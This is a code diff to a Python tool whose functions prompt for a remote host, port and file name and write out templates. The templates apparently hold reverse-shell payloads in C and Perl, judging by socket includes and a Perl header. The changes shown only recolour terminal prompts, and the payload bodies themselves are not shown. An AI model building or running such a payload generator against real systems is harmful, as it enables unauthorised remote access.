@@ -5,13 +5,14 @@ import readline , os
 from colorama import Fore
 def PRM():
     try:
-        ip = input ("RHOST > ")
+        ip = input (Fore.RESET+"RHOST > ")
         ip = "\"%s\""%(ip)
-        print (Fore.GREEN+"\nRemote HOST > %s\n"%ip)
-        port = int(input("RPORT > "))
-        print (Fore.LIGHTWHITE_EX+"\nRemote PORT > %s\n"%port)
-        name = input ("\nEnter File Name :")
-        print (Fore.RED+"\nName OF File > %s"%name)
+        print (Fore.CYAN+"\nRemote HOST > %s\n"%ip)
+        port = int(input(Fore.RESET+"RPORT > "))
+        print (Fore.CYAN+"\nRemote PORT > %s"%port)
+        name = input (Fore.RESET+"\nEnter File Name :")
+        print (Fore.CYAN+"\nName OF File > %s"%name)
+        print (Fore.RESET+"")
 
         File = open(name,'w')
         T = '''
@@ -37,13 +38,15 @@ def PRM():
 
 def CRM():
     try:
-        ip = input ("RHOST > ")
+        ip = input (Fore.RESET+"RHOST > ")
         ip = "\"%s\""%(ip)
-        print (Fore.GREEN+"\nRemote HOST > %s\n"%ip)
-        port = int(input("RPORT > "))
-        print (Fore.LIGHTWHITE_EX+"\nRemote PORT > %s\n"%port)
-        name = input ("\nEnter File Name :")
-        print (Fore.RED+"\nName OF File > %s"%name)
+        print (Fore.CYAN+"\nRemote HOST > %s\n"%ip)
+        port = int(input(Fore.RESET+"RPORT > "))
+        print (Fore.CYAN+"\nRemote PORT > %s"%port)
+        name = input (Fore.RESET+"\nEnter File Name :")
+        print (Fore.CYAN+"\nName OF File > %s"%name)
+        print (Fore.RESET+"")
+        
         shell = '''
     #include <stdio.h>
     #include <sys/socket.h>
@@ -88,13 +91,14 @@ def CRM():
 
 def PERM():
     try:
-        ip = input ("RHOST > ")
+        ip = input (Fore.RESET+"RHOST > ")
         ip = "\"%s\""%(ip)
-        print (Fore.GREEN+"\nRemote HOST > %s\n"%ip)
-        port = int(input("RPORT > "))
-        print (Fore.LIGHTWHITE_EX+"\nRemote PORT > %s\n"%port)
-        name = input ("\nEnter File Name :")
-        print (Fore.RED+"\nName OF File > %s"%name)
+        print (Fore.CYAN+"\nRemote HOST > %s\n"%ip)
+        port = int(input(Fore.RESET+"RPORT > "))
+        print (Fore.CYAN+"\nRemote PORT > %s"%port)
+        name = input (Fore.RESET+"\nEnter File Name :")
+        print (Fore.CYAN+"\nName OF File > %s"%name)
+        print (Fore.RESET+"")
 
         P0 = '''
 #!/usr/bin/perl -w
